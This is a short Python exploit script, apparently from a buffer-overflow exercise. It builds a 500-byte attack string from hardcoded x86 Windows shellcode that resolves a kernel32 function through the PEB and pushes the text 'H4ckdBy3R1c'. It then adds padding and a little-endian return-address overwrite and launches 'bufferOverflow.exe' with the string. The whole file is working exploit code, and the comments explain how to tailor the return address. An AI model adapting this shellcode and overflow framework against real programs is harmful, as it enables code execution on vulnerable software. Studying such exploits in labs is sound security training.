import subprocess

#reverse a string in python
#we need to reverse the bytes
#of the return address
#little endian format
def reversed_string(a_string):
    return a_string[::-1]

payload = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x52\x31\x63\x01\x68\x64\x42\x79\x33\x68\x48\x34\x63\x6b\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7"

length = len(payload)

needed = 500 - length

exploit = payload
exploit += "a" * needed
exploit += "a" * 4

#the last 3 bytes of the target return address
#for example if it was: 00 AA BB CC
#omit the leading zeroes
exploit += reversed_string("\xAA\xBB\xCC")



#run file with exploit string as argument
subprocess.call(['bufferOverflow.exe', exploit])
